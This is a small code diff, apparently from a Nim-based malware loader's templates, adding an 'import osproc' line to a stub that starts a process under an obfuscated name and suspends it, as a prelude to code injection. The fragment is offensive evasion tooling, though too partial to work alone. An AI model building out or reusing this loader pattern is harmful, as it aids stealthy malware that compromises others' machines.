@@ -977,7 +977,7 @@ SleepyCryptLoop(10000)
 """
 
 let NotepadProcIDStub * = fmt"""
-
+import osproc
 # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
 let tProcess = startProcess(obf("{customspawnprocess}"))
 tProcess.suspend() # That's handy!
